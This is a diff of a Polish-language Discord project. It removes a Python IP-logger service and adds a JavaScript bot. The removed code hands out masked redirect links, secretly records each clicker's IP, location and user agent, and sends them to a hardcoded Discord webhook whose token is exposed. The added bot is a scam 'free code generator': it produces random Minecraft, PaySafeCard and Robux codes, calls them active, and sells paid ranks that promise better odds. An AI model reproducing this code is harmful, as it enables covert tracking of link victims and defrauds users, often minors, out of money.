@@ -1,160 +1,181 @@
-import os
-import asyncio
-import random
-import string
-from datetime import datetime
-from flask import Flask, request, redirect, jsonify
-import requests
-import discord
-from discord import app_commands
-from asgiref.wsgi import WsgiToAsgi
+const { Client, GatewayIntentBits, SlashCommandBuilder, EmbedBuilder, ChannelType, PermissionFlagsBits } = require('discord.js');
 
-# ========================================================
-# CONFIGURATION
-# ========================================================
-WEBHOOK_URL = 'https://discord.com/api/webhooks/1508140013651624067/nMxvkUrDRE_0GyeZ15dPV_1DIJ04VGUlKlSQCgG6C61v0118dLK81ojbtovwab88Xcal'
-BOT_TOKEN = os.environ.get('DISCORD_BOT_TOKEN')
-SERVER_URL = 'https://server-mc.onrender.com'
+const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers] });
 
-# ========================================================
-# FLASK SERVER (Backend)
-# ========================================================
-app = Flask(__name__)
-links_database = {}
+// --- KONFIGURACJA ZMIENNYCH ---
+// Zamiast wpisywać token na sztywno, bot pobierze go z ustawień hostingu
+const TOKEN = process.env.DISCORD_TOKEN; 
 
-def generate_random_id(length=6):
-    characters = string.ascii_lowercase + string.digits
-    return ''.join(random.choice(characters) for _ in range(length))
+const ROLE_PRO_ID = '1512520808839381012';
+const ROLE_ULTRA_ID = '1512520692015562812';
 
-@app.route('/generate', methods=['POST'])
-def generate_link():
-    data = request.get_json()
-    if not data or 'originalUrl' not in data:
-        return jsonify({"error": "Brak oryginalnego URL"}), 400
-    
-    original_url = data['originalUrl']
-    link_id = generate_random_id()
-    links_database[link_id] = original_url
-    
-    logger_url = f"{SERVER_URL}/redirect/{link_id}"
-    return jsonify({"loggerUrl": logger_url})
+const CD_UZER = 5 * 60 * 60 * 1000;
+const CD_PRO = 30 * 60 * 1000;
+const CD_ULTRA = 30 * 1000;
 
-@app.route('/redirect/<link_id>', methods=['GET'])
-def redirect_to_url(link_id):
-    original_url = links_database.get(link_id)
-    if not original_url:
-        return "Link nie istnieje lub wygasł.", 404
+const cooldowns = new Map();
 
-    user_agent = request.headers.get('User-Agent', 'Nieznany')
-    user_ip = request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or request.remote_addr
+function generateRandomCode(template) {
+    return template.replace(/X/g, () => {
+        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+        return chars.charAt(Math.floor(Math.random() * chars.length));
+    });
+}
 
-    geo_data = {
-        "status": "fail", "country": "Nieznany", "regionName": "Nieznany",
-        "city": "Nieznany", "isp": "Nieznany", "as": "Nieznany",
-        "lat": 0, "lon": 0, "timezone": "Nieznany", "hosting": False
+function formatTime(ms) {
+    const s = Math.ceil(ms / 1000);
+    if (s < 60) return `${s}s`;
+    const m = Math.floor(s / 60);
+    if (m < 60) return `${m}m ${s % 60}s`;
+    const h = Math.floor(m / 60);
+    return `${h}h ${m % 60}m`;
+}
+
+client.once('ready', async () => {
+    console.log(`🤖 Bot zalogowany na hostingu jako ${client.user.tag}!`);
+
+    const commands = [
+        new SlashCommandBuilder().setName('gen-mc').setDescription('Generuje kod podarunkowy do Minecraft'),
+        new SlashCommandBuilder().setName('gen-psc').setDescription('Generuje kod zasilający PaySafeCard'),
+        new SlashCommandBuilder().setName('gen-roblox').setDescription('Generuje kod na darmowe Robuxy'),
+        new SlashCommandBuilder()
+            .setName('setup-server')
+            .setDescription('Automatycznie tworzy strukturę kanałów i cennik rang generatora')
+            .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
+    ];
+
+    await client.application.commands.set(commands);
+    console.log('✅ Komendy zarejestrowane!');
+});
+
+client.on('interactionCreate', async interaction => {
+    if (!interaction.isChatInputCommand()) return;
+
+    const { commandName, user, member, guild } = interaction;
+    const userId = user.id;
+
+    if (commandName === 'setup-server') {
+        await interaction.reply({ content: '⚙️ Rozpoczynam budowanie struktury serwera... Proszę czekać.', ephemeral: true });
+
+        try {
+            const mainCategory = await guild.channels.create({
+                name: '📢 ▬▬ GŁÓWNA STREFA ▬▬',
+                type: ChannelType.GuildCategory,
+            });
+
+            const infoChannel = await guild.channels.create({ name: '💬｜regulamin', type: ChannelType.GuildText, parent: mainCategory.id });
+            const shopChannel = await guild.channels.create({ name: '🛒｜cennik-rang', type: ChannelType.GuildText, parent: mainCategory.id });
+            const proofChannel = await guild.channels.create({ name: '✅｜dowody-legit', type: ChannelType.GuildText, parent: mainCategory.id });
+
+            const genCategory = await guild.channels.create({
+                name: '🔑 ▬▬ DARMOWE KODY ▬▬',
+                type: ChannelType.GuildCategory,
+            });
+
+            await guild.channels.create({ name: '🎮｜gen-minecraft', type: ChannelType.GuildText, parent: genCategory.id });
+            await guild.channels.create({ name: '🤖｜gen-roblox', type: ChannelType.GuildText, parent: genCategory.id });
+            await guild.channels.create({ name: '💳｜gen-psc', type: ChannelType.GuildText, parent: genCategory.id });
+
+            const priceEmbed = new EmbedBuilder()
+                .setColor('#FFD700')
+                .setTitle('🛒 SKLEP GENERATORA – OFERTA RANG')
+                .setDescription('Chcesz generować kody znacznie częściej bez długiego czekania? Zdobądź wyższą rangę i omiń limity!')
+                .addFields(
+                    { name: '👤 Ranga: UZER', value: '• **Cena:** `DARMOWA` (Dla każdego)\n• Cooldown: **5 godzin** na komendę\n• Dostęp do podstawowych generatorów.', inline: false },
+                    { name: '💎 Ranga: PRO', value: '• **Cena:** `10 PLN` (PSC / Blik / SMS)\n• Cooldown: **Skrócony do 30 minut!**\n• Większa szansa na trafienie działającego kodu.', inline: false },
+                    { name: '🔥 Ranga: ULTRA', value: '• **Cena:** `25 PLN` (PSC / Blik)\n• Cooldown: **Zaledwie 30 sekund!** (Brak limitów)\n• Priorytetowe generowanie i unikalny kolor na serwerze.', inline: false }
+                )
+                .setThumbnail(client.user.displayAvatarURL())
+                .setFooter({ text: 'W celu zakupu skontaktuj się z Właścicielem serwera poprzez Ticket / DM!' });
+
+            await shopChannel.send({ embeds: [priceEmbed] });
+            return await interaction.editReply({ content: '✅ Serwer został pomyślnie zbudowany!' });
+
+        } catch (error) {
+            console.error(error);
+            return await interaction.editReply({ content: '❌ Wystąpił błąd podczas budowania serwera. Sprawdź uprawnienia bota.' });
+        }
     }
 
-    try:
-        ip_to_check = '181.41.202.157' if user_ip in ['127.0.0.1', '::1'] else user_ip
-        fields = "status,message,country,regionName,city,isp,as,lat,lon,timezone,hosting"
-        geo_response = requests.get(f"http://ip-api.com/json/{ip_to_check}?fields={fields}", timeout=5)
-        if geo_response.status_code == 200 and geo_response.json().get('status') == 'success':
-            geo_data = geo_response.json()
-    except Exception as e:
-        print(f"Błąd GeoIP: {e}")
+    let userCooldownDuration = CD_UZER; 
+    let rankName = 'UZER';
 
-    discord_payload = {
-        "embeds": [{
-            "title": "🌐 Image Logger - IP Logged",
-            "description": "**A User Opened the Original Link!**\n\n**Endpoint:** `/api/image`",
-            "color": 1752220,
-            "fields": [
-                {
-                    "name": "📌 IP Info:",
-                    "value": (
-                        f"**IP:** `{user_ip}`\n"
-                        f"**Provider:** `{geo_data['isp']}`\n"
-                        f"**ASN:** `{geo_data['as']}`\n"
-                        f"**Country:** `{geo_data['country']}`\n"
-                        f"**Region:** `{geo_data['regionName']}`\n"
-                        f"**City:** `{geo_data['city']}`\n"
-                        f"**Coords:** `{geo_data['lat']}, {geo_data['lon']}`\n"
-                        f"**Timezone:** `{geo_data['timezone']}`\n"
-                        f"**VPN/Hosting:** `{'True' if geo_data['hosting'] else 'False'}`\n"
-                        f"**User-Agent:** `{user_agent[:100]}...`"
-                    ),
-                    "inline": False
-                }
-            ],
-            "footer": {
-                "text": f"Czas zdarzenia: {datetime.now().strftime('%d.%m.%Y, %H:%M:%S')}"
-            }
-        }]
+    if (member.roles.cache.has(ROLE_ULTRA_ID)) {
+        userCooldownDuration = CD_ULTRA;
+        rankName = 'ULTRA';
+    } else if (member.roles.cache.has(ROLE_PRO_ID)) {
+        userCooldownDuration = CD_PRO;
+        rankName = 'PRO';
     }
 
-    try:
-        requests.post(WEBHOOK_URL, json=discord_payload, timeout=5)
-    except Exception as e:
-        print(f"Błąd Webhooka: {e}")
+    const cooldownKey = `${userId}-${commandName}`;
+    if (cooldowns.has(cooldownKey)) {
+        const expirationTime = cooldowns.get(cooldownKey) + userCooldownDuration;
+        const now = Date.now();
 
-    return redirect(original_url)
+        if (now < expirationTime) {
+            const timeLeft = expirationTime - now;
+            const errorEmbed = new EmbedBuilder()
+                .setColor('#FF0000')
+                .setTitle('❌ Limit wyczerpany!')
+                .setDescription(`Twoja ranga to **${rankName}**. Możesz wygenerować kolejny kod dopiero za:\n⏳ **${formatTime(timeLeft)}**`)
+                .setFooter({ text: 'Chcesz generować częściej? Kup wyższą rangę!' });
+            
+            return interaction.reply({ embeds: [errorEmbed], ephemeral: true });
+        }
+    }
 
-@app.route('/')
-def home():
-    return "OK", 200
+    let code = '';
+    let title = '';
 
-# ========================================================
-# DISCORD BOT
-# ========================================================
-class MyClient(discord.Client):
-    def __init__(self):
-        super().__init__(intents=discord.Intents.default())
-        self.tree = app_commands.CommandTree(self)
+    if (commandName === 'gen-mc') {
+        code = generateRandomCode('XXXX-XXXX-XXXX');
+        title = '🎮 KOD MINECRAFT';
+    } else if (commandName === 'gen-psc') {
+        code = generateRandomCode('XXXX-XXXX-XXXX-XXXX');
+        title = '💳 KOD PAYSAFECARD';
+    } else if (commandName === 'gen-roblox') {
+        code = generateRandomCode('XXXX-XXXX-XXXX');
+        title = '🤖 KOD ROBLOX ROBUX';
+    }
 
-    async def on_ready(self):
-        print(f'Bot zalogowany jako {self.user}')
-        try:
-            await self.tree.sync()
-            print("Komendy slash zsynchronizowane.")
-        except Exception as e:
-            print(f"Błąd synchronizacji: {e}")
+    const dmEmbed = new EmbedBuilder()
+        .setColor('#00FF00')
+        .setTitle(`${title} WYGENEROWANY!`)
+        .setDescription(`Twój kod został pomyślnie wyciągnięty z bazy danych!\n\n**KOD:** \`\`\`${code}\`\`\`\n*Zrealizuj go jak najszybciej.*`)
+        .addFields(
+            { name: 'Użyta ranga', value: `\`${rankName}\``, inline: true },
+            { name: 'Status kodu', value: '🟢 Aktywny', inline: true }
+        )
+        .setFooter({ text: 'Dzięki za korzystanie z bazy!' });
 
-bot_client = MyClient()
+    try {
+        await user.send({ embeds: [dmEmbed] });
 
-@bot_client.tree.command(name="link", description="Generuje zmaskowany link typu logger")
-@app_commands.describe(url="Wklej oryginalny adres URL")
-async def link(interaction: discord.Interaction, url: str):
-    await interaction.response.defer(ephemeral=True)
-    link_id = generate_random_id()
-    links_database[link_id] = url
-    logger_url = f"{SERVER_URL}/redirect/{link_id}"
-    await interaction.followup.send(content=f"🟢 **Link wygenerowany:**\n`{logger_url}`", ephemeral=True)
+        const successChannelEmbed = new EmbedBuilder()
+            .setColor('#00FF00')
+            .setTitle('✅ Kod wysłany!')
+            .setDescription(`Hej ${user}, wygenerowano nowy kod i wysłano go w **wiadomości prywatnej (PV)**! Sprawdź DM. 📬`)
+            .setFooter({ text: `Ranga: ${rankName} • Następny za: ${formatTime(userCooldownDuration)}` });
 
-# ========================================================
-# ASGI LIFECYCLE (Uvicorn integration)
-# ========================================================
-wsgi_app = WsgiToAsgi(app)
+        cooldowns.set(cooldownKey, Date.now());
+        await interaction.reply({ embeds: [successChannelEmbed] });
 
-async def start_bot():
-    if BOT_TOKEN:
-        try:
-            await bot_client.start(BOT_TOKEN)
-        except Exception as e:
-            print(f"Błąd startu bota: {e}")
-    else:
-        print("🚨 Brak DISCORD_BOT_TOKEN!")
+    } catch (error) {
+        const errorChannelEmbed = new EmbedBuilder()
+            .setColor('#FF0000')
+            .setTitle('❌ Błąd wysyłania!')
+            .setDescription(`Nie mogłem wysłać kodu do Ciebie, ${user}.\n\n⚠️ **Masz zablokowane wiadomości prywatne (DM) z tego serwera!** Odblokuj je w ustawieniach i spróbuj ponownie.`)
+            .setFooter({ text: 'Status: Blokada DM' });
 
-# Serwer ASGI, który zostanie wywołany przez Uvicorn
-async def asgi_app(scope, receive, send):
-    if scope['type'] == 'lifespan':
-        while True:
-            message = await receive()
-            if message['type'] == 'lifespan.startup':
-                # Odpal bota w tle pętli zdarzeń Uvicorna
-                asyncio.create_task(start_bot())
-                await send({'type': 'lifespan.startup.complete'})
-            elif message['type'] == 'lifespan.shutdown':
-                await send({'type': 'lifespan.shutdown.complete'})
-                return
-    else:
-        await wsgi_app(scope, receive, send)
+        await interaction.reply({ embeds: [errorChannelEmbed], ephemeral: true });
+    }
+});
+
+// Zabezpieczenie przed wywaleniem bota, gdy w panelu nie ma tokenu
+if (!TOKEN) {
+    console.error("❌ BŁĄD: Brak zmiennej DISCORD_TOKEN w konfiguracji hostingu!");
+    process.exit(1);
+}
+
+client.login(TOKEN);
